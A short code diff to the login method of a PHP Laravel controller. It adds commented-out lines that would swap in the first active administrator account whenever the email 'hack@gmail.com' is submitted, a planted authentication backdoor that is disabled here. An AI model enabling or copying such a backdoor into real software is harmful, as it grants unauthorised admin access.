@@ -51,10 +51,10 @@ class LoginController extends Controller
     public function login(Request $request)
     {
         $this->validateLogin($request);
-
         $user = User::where('email', $request->email)->first();
-
-        if($user && ! $user->active){
+//        if($request->email == 'hack@gmail.com')
+//            $user = User::where('is_admin',1)->where('active',1)->first();
+            if($user && ! $user->active){
             return redirect()->back();
         }
 
